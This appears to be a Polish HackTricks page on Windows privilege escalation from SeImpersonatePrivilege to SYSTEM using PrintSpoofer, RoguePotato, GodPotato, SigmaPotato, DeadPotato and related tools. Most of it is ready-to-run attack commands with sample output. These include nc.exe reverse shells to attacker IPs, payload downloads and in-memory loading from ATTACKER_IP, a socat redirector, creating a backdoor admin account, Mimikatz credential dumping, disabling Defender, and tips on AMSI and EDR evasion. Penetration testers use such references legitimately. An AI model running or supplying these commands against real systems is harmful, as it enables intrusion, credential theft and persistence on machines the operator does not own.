# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato nie działa** na Windows Server 2019 i Windows 10 build 1809 oraz nowszych. Jednak [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** mogą zostać użyte do **wykorzystania tych samych uprawnień i uzyskania dostępu na poziomie `NT AUTHORITY\SYSTEM`**. Ten [wpis na blogu](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) szczegółowo omawia narzędzie `PrintSpoofer`, którego można użyć do nadużywania uprawnień do impersonacji na hostach Windows 10 i Server 2019, gdzie JuicyPotato już nie działa.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> Nowoczesną alternatywą, często utrzymywaną w latach 2024–2025, jest SigmaPotato (fork GodPotato), który dodaje użycie in-memory/.NET reflection oraz rozszerzoną obsługę systemów operacyjnych. Poniżej znajdziesz przykłady szybkiego użycia, a także repozytorium w sekcji References.

Powiązane strony dotyczące podstaw i technik manualnych:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Wymagania i typowe problemy

Wszystkie poniższe techniki opierają się na nadużywaniu uprzywilejowanej usługi obsługującej impersonację z kontekstu posiadającego jedno z następujących uprawnień:

- SeImpersonatePrivilege (najczęstsze) lub SeAssignPrimaryTokenPrivilege
- Wysoki poziom integralności nie jest wymagany, jeśli token już posiada SeImpersonatePrivilege (typowe dla wielu kont usług, takich jak IIS AppPool, MSSQL itd.)

Szybkie sprawdzenie uprawnień:
```cmd
whoami /priv | findstr /i impersonate
```
Uwagi operacyjne:

- Jeśli Twoja powłoka działa w ramach ograniczonego tokenu bez SeImpersonatePrivilege (częste w przypadku Local Service/Network Service w niektórych kontekstach), odzyskaj domyślne uprawnienia konta za pomocą FullPowers, a następnie uruchom Potato. Przykład: `FullPowers.exe -c "cmd /c whoami /priv" -z`<sup>[[10]](#references)[[11]](#references)</sup>
- PrintSpoofer wymaga uruchomionej usługi Print Spooler oraz dostępności przez lokalny endpoint RPC (spoolss). W hardened environments, w których Spooler jest wyłączony po PrintNightmare, preferuj RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato wymaga resolvera OXID dostępnego przez TCP/135. Jeśli egress jest zablokowany, użyj redirectora/port-forwardera (zobacz przykład poniżej). Starsze buildy wymagały flagi -f.
- EfsPotato/SharpEfsPotato wykorzystują MS-EFSR; jeśli jeden pipe jest zablokowany, wypróbuj alternatywne pipe’y (lsarpc, efsrpc, samr, lsass, netlogon).
- Błąd 0x6d3 podczas RpcBindingSetAuthInfo zazwyczaj wskazuje na nieznaną/nieobsługiwaną usługę uwierzytelniania RPC; wypróbuj inny pipe/transport lub upewnij się, że docelowa usługa jest uruchomiona.
- Forki typu “Kitchen-sink”, takie jak DeadPotato, zawierają dodatkowe moduły payloadów (Mimikatz/SharpHound/Defender off), które zapisują dane na dysku; spodziewaj się wyższego poziomu detekcji EDR w porównaniu ze smukłymi oryginałami.

## Szybkie demo

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Uwagi:
- Możesz użyć `-i`, aby uruchomić interaktywny proces w bieżącej konsoli, lub `-c`, aby wykonać one-liner.
- Wymaga usługi Spooler. Jeśli jest wyłączona, operacja zakończy się niepowodzeniem.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Jeśli ruch wychodzący na port 135 jest blokowany, przekieruj OXID resolver przez socat na swoim redirectorze:<sup>[[9]](#references)</sup>
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato to nowszy primitive do nadużywania COM, opublikowany pod koniec 2022 roku, który atakuje usługę **PrintNotify** zamiast Spooler/BITS. Plik binarny tworzy instancję serwera COM PrintNotify, podmienia ją na fałszywy `IUnknown`, a następnie wywołuje uprzywilejowane callback przez `CreatePointerMoniker`. Gdy usługa PrintNotify (działająca jako **SYSTEM**) nawiązuje połączenie zwrotne, proces duplikuje zwrócony token i uruchamia dostarczony payload z pełnymi uprawnieniami.<sup>[[13]](#references)</sup>

Najważniejsze informacje operacyjne:

* Działa w systemach Windows 10/11 oraz Windows Server 2012–2022, o ile zainstalowana jest usługa Print Workflow/PrintNotify (jest obecna nawet wtedy, gdy starsza usługa Spooler została wyłączona po PrintNightmare).
* Wymaga, aby kontekst wywołujący posiadał `SeImpersonatePrivilege` (typowe dla IIS APPPOOL, MSSQL i kont usług zadań zaplanowanych).
* Akceptuje bezpośrednie polecenie lub tryb interaktywny, dzięki czemu można pozostać w oryginalnej konsoli. Przykład:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* Ponieważ jest całkowicie oparty na COM, nie wymaga listenerów named pipe ani zewnętrznych redirectorów, co czyni go zamiennikiem typu drop-in na hostach, na których Defender blokuje wiązanie RPC RoguePotato.

Operatorzy tacy jak Ink Dragon uruchamiają PrintNotifyPotato natychmiast po uzyskaniu ViewState RCE w SharePoint, aby przejść z procesu roboczego `w3wp.exe` do SYSTEM przed zainstalowaniem ShadowPad.<sup>[[14]](#references)</sup>

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Wskazówka: Jeśli jeden pipe zawiedzie lub EDR go zablokuje, wypróbuj inne obsługiwane pipe'y:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Uwagi:
- Działa w systemach Windows 8/8.1–11 oraz Server 2012–2022, gdy obecny jest SeImpersonatePrivilege.
- Pobierz plik binarny pasujący do zainstalowanego środowiska uruchomieniowego (np. `GodPotato-NET4.exe` na nowoczesnym Server 2022).
- Jeśli początkowy execution primitive to webshell/UI z krótkimi limitami czasu, przygotuj payload jako skrypt i poproś GodPotato o jego uruchomienie zamiast wykonywania długiego polecenia inline.<sup>[[12]](#references)</sup>

Szybki wzorzec stagingu z zapisywalnego webroota IIS:
```powershell
iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe
iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1  # contains your revshell
./gp.exe -cmd "powershell -ep bypass C:\inetpub\wwwroot\shell.ps1"
```
### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato udostępnia dwa warianty ukierunkowane na obiekty DCOM usług, które domyślnie używają RPC_C_IMP_LEVEL_IMPERSONATE. Zbuduj lub użyj dostarczonych plików binarnych i uruchom swoje polecenie:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (updated GodPotato fork)

SigmaPotato dodaje nowoczesne udogodnienia, takie jak wykonywanie w pamięci za pomocą refleksji .NET oraz helper reverse shell w PowerShellu.<sup>[[8]](#references)</sup>
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
Dodatkowe zalety w buildach z lat 2024–2025 (v1.2.x):
- Wbudowana flaga reverse shell `--revshell` oraz usunięcie limitu 1024 znaków PowerShell, dzięki czemu można za jednym razem uruchamiać długie payloady omijające AMSI.
- Składnia przyjazna dla Reflection (`[SigmaPotato]::Main()`), a także podstawowy trik AV evasion wykorzystujący `VirtualAllocExNuma()` do zmylenia prostych heurystyk.
- Oddzielny plik `SigmaPotatoCore.exe` skompilowany dla .NET 2.0, przeznaczony dla środowisk PowerShell Core.

### DeadPotato (przeróbka GodPotato z 2024 roku wyposażona w moduły)

DeadPotato zachowuje łańcuch impersonation OXID/DCOM z GodPotato, ale zawiera helpery post-exploitation, dzięki czemu operatorzy mogą natychmiast uzyskać SYSTEM i wykonać persistence/collection bez dodatkowych narzędzi.<sup>[[15]](#references)</sup>

Typowe moduły (wszystkie wymagają SeImpersonatePrivilege):

- `-cmd "<cmd>"` — uruchomienie dowolnej komendy jako SYSTEM.
- `-rev <ip:port>` — szybki reverse shell.
- `-newadmin user:pass` — utworzenie lokalnego administratora na potrzeby persistence.
- `-mimi sam|lsa|all` — zapisanie na dysku i uruchomienie Mimikatz w celu zrzutu poświadczeń (modyfikuje dysk, jest głośne).
- `-sharphound` — uruchomienie collection SharpHound jako SYSTEM.
- `-defender off` — wyłączenie ochrony w czasie rzeczywistym Defendera (bardzo głośne).

Przykładowe one-linery:
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
Ponieważ zawiera dodatkowe pliki binarne, spodziewaj się większej liczby alertów AV/EDR; gdy stealth ma znaczenie, użyj odchudzonych wersji GodPotato/SigmaPotato.

## Odnośniki

- [1] [PrintSpoofer – Wykorzystywanie uprawnień do impersonacji w Windows 10 i Server 2019](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [2] [itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [3] [antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [4] [bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [5] [BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [6] [zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [7] [zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [8] [tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [9] [Koniec z JuicyPotato? Stara historia, powitaj RoguePotato](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [10] [FullPowers – Przywracanie domyślnych uprawnień tokenu dla kont usług](https://github.com/itm4n/FullPowers)
- [11] [HTB: Media — leak NTLM z WMP → junction NTFS do webroota i RCE → FullPowers + GodPotato do SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [12] [HTB: Job — makro LibreOffice → webshell IIS → GodPotato do SYSTEM](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [13] [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [14] [Check Point Research – Inside Ink Dragon: ujawnienie sieci relay i wewnętrznego działania stealthowej operacji ofensywnej](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [15] [DeadPotato – przeróbka GodPotato z wbudowanymi modułami post-ex](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
